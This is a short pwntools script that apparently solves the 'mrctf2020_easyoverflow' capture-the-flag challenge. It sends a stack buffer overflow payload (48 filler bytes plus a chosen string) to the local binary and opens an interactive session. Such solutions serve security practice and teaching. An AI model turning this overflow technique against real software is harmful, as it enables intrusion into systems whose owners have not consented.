from pwn import *
io = process('./mrctf2020_easyoverflow')
#io = gdb.debug('./mrctf2020_easyoverflow')
payload = b'A'*48+b'n0t_r3@11y_f1@g\x00'
io.sendline(payload)
io.interactive()
